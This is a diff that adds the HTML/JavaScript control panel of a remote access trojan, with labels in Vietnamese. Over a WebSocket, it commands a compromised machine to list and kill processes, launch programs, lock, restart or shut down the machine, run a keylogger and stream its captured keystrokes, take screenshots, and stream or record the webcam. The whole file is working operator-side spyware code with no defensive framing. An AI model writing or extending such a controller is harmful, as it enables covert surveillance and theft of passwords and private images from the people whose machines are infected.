@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Web Controller Final</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        /* BASE STYLES */
+        body { background-color: #f8f9fa; }
+        .card { border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        .btn-group { margin-top: 10px; }
+
+        /* KEYLOGGER & PROCESS LIST */
+        #keylog-output { 
+            height: 250px; 
+            overflow-y: scroll; 
+            font-family: monospace; 
+            font-size: 0.9em; 
+            background: #fff; 
+            border: 1px solid #dee2e6; 
+            padding: 10px; 
+            white-space: pre-wrap; /* Quan trọng cho Keylog */
+        }
+        #process-list-output { max-height: 250px; overflow-y: auto; background: #fff; padding: 10px; border: 1px solid #dee2e6; border-radius: 5px; font-size: 0.85em; }
+        
+        /* WEBCAM FEED */
+        #webcam-feed { max-width: 100%; height: auto; border: 1px solid #000; display: block; margin-top: 10px; }
+
+        /* FEEDBACK AREA */
+        #immediate-feedback {
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            display: none;
+        }
+        .feedback-success { background-color: #d1e7dd; color: #0f5132; border: 1px solid #badbcc; }
+        .feedback-error { background-color: #f8d7da; color: #842029; border: 1px solid #f5c2c7; }
+        .feedback-info { background-color: #cff4fc; color: #055160; border: 1px solid #b6effb; }
+    </style>
+</head>
+<body>
+    <div class="container mt-4">
+        <h1 class="text-center mb-4 text-primary">RAT Server Control Panel</h1>
+        
+        <div class="card p-3 mb-4 bg-light">
+            <h5>Trạng thái Kết nối: 
+                <span id="ws-status" class="badge bg-danger">DISCONNECTED</span>
+                <span id="keylog-status" class="badge bg-secondary ms-3">KEYLOGGER: Dừng</span>
+            </h5>
+            <p>WebSocket URL: <code>{{ ws_url }}</code></p>
+        </div>
+        
+        <div id="immediate-feedback" role="alert"></div>
+
+        <div class="row">
+            <div class="col-md-6">
+                <div class="card p-4">
+                    <h4 class="card-title text-success">1. Quản Lý Hệ Thống & Tiến Trình</h4>
+                    
+                    <div class="btn-group mb-3">
+                        <button class="btn btn-outline-primary" onclick="sendCommand('LIST_PROC')">Xem Danh Sách Process</button>
+                    </div>
+
+                    <h5 class="mt-4">Diệt Tiến Trình</h5>
+                    <div class="input-group mb-3">
+                        <input type="text" id="pid-input" class="form-control" placeholder="PID (số) hoặc Tên Process (e.g., chrome.exe)" onkeypress="handleEnterKey(event, 'kill')">
+                        <button class="btn btn-danger" onclick="killProcess()">Diệt Process</button>
+                    </div>
+                    
+                    <h5 class="mt-4">Khởi Chạy Ứng Dụng/Web</h5>
+                    <div class="input-group mb-3">
+                        <input type="text" id="app-input" class="form-control" placeholder="Tên App/Web (e.g., notepad, www.google.com)" onkeypress="handleEnterKey(event, 'start')">
+                        <button class="btn btn-success" onclick="startApp()">Mở App/Web</button>
+                    </div>
+                    
+                    <h5 class="mt-4">Tiến trình đang chạy:</h5>
+                    <div id="process-list-output">
+                        <p class="text-muted">Bấm "Xem Process" để tải danh sách...</p>
+                    </div>
+                    
+                    <h5 class="mt-4">Điều Khiển Nguồn</h5>
+                    <div class="btn-group">
+                        <button class="btn btn-warning" onclick="sendCommand('SYSTEM_CONTROL', {type: 'LOCK'})">Khóa Máy 🔒</button>
+                        <button class="btn btn-secondary" onclick="sendCommand('SYSTEM_CONTROL', {type: 'RESTART'})">Khởi Động Lại</button>
+                        <button class="btn btn-danger" onclick="sendCommand('SYSTEM_CONTROL', {type: 'SHUTDOWN'})">Tắt Máy</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-md-6">
+                <div class="card p-4">
+                    <h4 class="card-title text-info">2. Theo Dõi & Đa Phương Tiện</h4>
+
+                    <h5 class="mt-3">Keylogger Log</h5>
+                    <div class="btn-group mb-3">
+                        <button id="btn-start-keylog" class="btn btn-success" onclick="startKeylogger()">Bật Keylogger</button>
+                        <button id="btn-stop-keylog" class="btn btn-danger" onclick="stopKeylogger()">Tắt Keylogger</button>
+                    </div>
+                    <div id="keylog-output">Chờ lệnh START_KEYLOG...</div>
+
+                    <h5 class="mt-4">Media Control</h5>
+                    <button class="btn btn-primary mb-2" onclick="sendCommand('SCREENSHOT')">Chụp Màn Hình 📸</button>
+                    
+                    <div class="btn-group">
+                        <button class="btn btn-info" onclick="startWebcam()">Bật Live Stream</button>
+                        <button class="btn btn-danger" onclick="stopWebcam()">Tắt Stream</button>
+                        <button class="btn btn-warning" onclick="startRecord()">Ghi Hình 10s</button>
+                    </div>
+                    
+                    <h5 class="mt-4">Live Webcam Feed:</h5>
+                    <img id="webcam-feed" src="" alt="Webcam Feed" class="img-fluid">
+                </div>
+            </div>
+        </div>
+
+        <div id="alert-output-container" style="display: none;">
+             <p id="alert-output"></p>
+        </div>
+    </div>
+
+    <script>
+        const wsUrl = "{{ ws_url }}"; 
+        let ws;
+        let isKeylogging = false;
+        let isStreaming = false; 
+        const alertOutput = document.getElementById('alert-output'); // Giữ lại cho console log
+        const feedbackElement = document.getElementById('immediate-feedback');
+
+        // --- HÀM A: HIỂN THỊ PHẢN HỒI TỨC THÌ ---
+        function displayFeedback(message, type) {
+            feedbackElement.textContent = message;
+            feedbackElement.className = `alert mt-2 feedback-${type}`;
+            feedbackElement.style.display = 'block';
+
+            setTimeout(() => {
+                feedbackElement.style.display = 'none';
+            }, 5000); 
+            
+            console.log(`[FEEDBACK] ${type.toUpperCase()}: ${message}`);
+        }
+
+        // --- HÀM B: XỬ LÝ DOWNLOAD (CHO SCREENSHOT VÀ VIDEO) ---
+        function downloadBase64(base64Data, filename, mimeType) {
+            const link = document.createElement('a');
+            link.href = 'data:' + mimeType + ';base64,' + base64Data;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // --- HÀM C: XỬ LÝ NHẤN PHÍM ENTER (MỚI) ---
+        function handleEnterKey(event, action) {
+            if (event.key === 'Enter') {
+                event.preventDefault();
+                if (action === 'kill') {
+                    killProcess();
+                } else if (action === 'start') {
+                    startApp();
+                }
+            }
+        }
+        
+        // --- HÀM D: KẾT NỐI VÀ XỬ LÝ WEBSOCKET ---
+        function connectWebSocket() {
+            ws = new WebSocket(wsUrl);
+            const statusElement = document.getElementById('ws-status');
+            const keylogStatus = document.getElementById('keylog-status');
+
+            ws.onopen = () => {
+                statusElement.textContent = 'CONNECTED';
+                statusElement.classList.remove('bg-danger', 'bg-warning');
+                statusElement.classList.add('bg-success');
+                displayFeedback("Kết nối WebSocket tới Server C++ thành công!", 'success');
+            };
+
+            ws.onerror = (error) => {
+                console.error("WebSocket Error:", error);
+            };
+
+            ws.onclose = () => {
+                statusElement.textContent = 'DISCONNECTED';
+                statusElement.classList.remove('bg-success', 'bg-warning');
+                statusElement.classList.add('bg-danger');
+                displayFeedback("Mất kết nối. Đang thử kết nối lại...", 'error');
+                
+                // Reset trạng thái
+                isKeylogging = false;
+                keylogStatus.textContent = 'KEYLOGGER: Dừng';
+                keylogStatus.classList.remove('bg-success');
+                keylogStatus.classList.add('bg-secondary');
+                
+                isStreaming = false;
+                document.getElementById('webcam-feed').src = "";
+                
+                setTimeout(connectWebSocket, 5000); 
+            };
+
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                const output = document.getElementById('keylog-output');
+                let feedbackType = 'info';
+
+                // 1. Xử lý Keylogger
+                if (data.type === 'KEYLOG_RESULT') {
+                    output.innerHTML += data.data; 
+                    output.scrollTop = output.scrollHeight; 
+                    if (isKeylogging) { 
+                        sendCommand('GET_KEYLOG');
+                    }
+                    return; 
+                }
+                
+                // 2. Xử lý Ảnh Chụp Màn Hình (Tải file)
+                else if (data.type === 'SCREENSHOT_RESULT') {
+                    const b64 = data.data;
+                    const filename = `screenshot_${Date.now()}.jpeg`;
+                    
+                    document.getElementById('webcam-feed').src = ''; 
+                    downloadBase64(b64, filename, 'image/jpeg');
+                    displayFeedback(`Ảnh chụp màn hình đã được tải xuống (${filename}).`, 'success');
+                }
+                
+                // 3. Xử lý Live Webcam Frame
+                else if (data.type === 'CAM_FRAME') {
+                    document.getElementById('webcam-feed').src = 'data:image/jpeg;base64,' + data.data;
+                    return; 
+                }
+                
+                // 4. Xử lý Process List
+                else if (data.type === 'LIST_RESULT') {
+                    const processData = data.data;
+                    const processListOutput = document.getElementById('process-list-output');
+                    
+                    let htmlContent = `<p class="fw-bold text-success">Tìm thấy ${processData.length} tiến trình:</p>`;
+                    
+                    processData.forEach(proc => {
+                        const parts = proc.split(' | ');
+                        const name = parts[0];
+                        const pid = parts[1];
+                        
+                        htmlContent += `<p class="mb-0"><strong>${name}</strong> (${pid})</p>`;
+                    });
+                    
+                    processListOutput.innerHTML = htmlContent;
+                    displayFeedback(`Đã nhận ${processData.length} tiến trình.`, 'success');
+                }
+                
+                // 5. Xử lý Kết Quả Hành Động (ACTION_RESULT) - CORE FEEDBACK
+                else if (data.type === 'ACTION_RESULT') {
+                    const msg = data.msg;
+                    
+                    if (msg.includes("THÀNH CÔNG") || msg.includes("Webcam Started") || msg.includes("Da diet") || msg.includes("hoan toan")) {
+                        feedbackType = 'success';
+                    } else if (msg.includes("THẤT BẠI") || msg.includes("Lỗi") || msg.includes("Khong tim thay")) {
+                        feedbackType = 'error';
+                    }
+                    else {
+                        feedbackType = 'info';
+                    }
+
+                    // Logic đồng bộ trạng thái webcam
+                    if (msg.includes("Webcam Stopping") || msg.includes("tat hoan toan")) {
+                        isStreaming = false;
+                        document.getElementById('webcam-feed').src = "";
+                        feedbackType = 'success'; // Đánh dấu thành công khi Server báo "hoàn toàn"
+                    }
+                    
+                    displayFeedback(msg, feedbackType);
+                }
+                
+                // 6. Xử lý Record Video (Tải file)
+                else if (data.type === 'RECORD_RESULT') {
+                    const b64 = data.data;
+                    const filename = `webcam_record_${Date.now()}.avi`;
+                    
+                    downloadBase64(b64, filename, 'video/avi');
+                    displayFeedback(`File Video đã được tải xuống (${filename}).`, 'success');
+                }
+                
+                console.log(`[SERVER LOG CHI TIẾT] ${JSON.stringify(data)}`);
+            };
+        }
+
+        // --- HÀM E: GỬI LỆNH JSON ---
+        function sendCommand(cmd, args = {}) {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                args.cmd = cmd;
+                ws.send(JSON.stringify(args));
+            } else {
+                displayFeedback("LỖI: Mất kết nối. Đang thử kết nối lại...", 'error');
+            }
+        }
+
+        // --- HÀM F: XỬ LÝ TƯƠNG TÁC BUTTON/ENTER ---
+        
+        function killProcess() {
+            const target = document.getElementById('pid-input').value.trim();
+            if (!target) {
+                displayFeedback("[LỖI NHẬP] Vui lòng nhập PID hoặc Tên Process.", 'error');
+                return; 
+            }
+            const sanitizedTarget = target.replace(/[^a-zA-Z0-9.\s]/g, '').trim(); 
+            displayFeedback(`Đang gửi lệnh diệt Process: ${sanitizedTarget}...`, 'info');
+            
+            if (!sanitizedTarget) {
+                 displayFeedback("[LỖI] Ký tự không hợp lệ đã bị loại bỏ. Vui lòng nhập lại.", 'error');
+                 return;
+            }
+
+            if (isNaN(sanitizedTarget)) {
+                sendCommand('KILL_PROC', { proc_name: sanitizedTarget });
+            } else {
+                sendCommand('KILL_PROC', { pid: sanitizedTarget });
+            }
+        }
+
+        function startApp() {
+            const name = document.getElementById('app-input').value.trim();
+            if (!name) {
+                displayFeedback("[LỖI NHẬP] Vui lòng nhập tên ứng dụng/web.", 'error');
+                return; 
+            }
+            const sanitizedName = name.replace(/[^a-zA-Z0-9.\s]/g, '').trim(); 
+            displayFeedback(`Đang gửi lệnh khởi chạy: ${sanitizedName}...`, 'info');
+            sendCommand('START_PROC', { name: sanitizedName });
+        }
+
+        function startKeylogger() {
+            if (!isKeylogging) {
+                isKeylogging = true;
+                sendCommand('START_KEYLOG'); 
+                sendCommand('GET_KEYLOG'); 
+                document.getElementById('keylog-output').textContent = 'Keylogger đang hoạt động...\n\n';
+                document.getElementById('keylog-status').textContent = 'KEYLOGGER: Hoạt động';
+                document.getElementById('keylog-status').classList.remove('bg-secondary');
+                document.getElementById('keylog-status').classList.add('bg-success');
+                displayFeedback("Keylogger đã được kích hoạt. Đang theo dõi...", 'success');
+            }
+        }
+
+        function stopKeylogger() {
+            isKeylogging = false;
+            document.getElementById('keylog-status').textContent = 'KEYLOGGER: Dừng';
+            document.getElementById('keylog-status').classList.remove('bg-success');
+            document.getElementById('keylog-status').classList.add('bg-secondary');
+            displayFeedback("Keylogger đã dừng theo dõi.", 'info');
+        }
+
+        function startWebcam() {
+            if (!isStreaming) {
+                isStreaming = true;
+                sendCommand('START_CAM');
+                displayFeedback("Đang yêu cầu Server bật Live Stream Webcam...", 'info');
+            } else {
+                displayFeedback("Webcam đã hoạt động. Vui lòng tắt trước khi Start lại.", 'info');
+            }
+        }
+
+        function stopWebcam() {
+            if (isStreaming) {
+                isStreaming = false; 
+                sendCommand('STOP_CAM');
+                // Gửi lệnh pending, Server sẽ xác nhận thành công sau khi join()
+                displayFeedback("Đã gửi lệnh dừng Webcam. Chờ Server xác nhận tắt hoàn toàn...", 'info');
+            }
+        }
+
+        function startRecord() {
+            if (isStreaming) {
+                 displayFeedback("[LỖI] Vui lòng tắt Live Stream trước khi Ghi hình.", 'error');
+            } else {
+                 sendCommand('RECORD_CAM');
+                 displayFeedback("Đã gửi lệnh Ghi hình 10s. Vui lòng chờ file tải về...", 'info');
+            }
+        }
+
+        // Khởi chạy khi load trang
+        connectWebSocket(); 
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
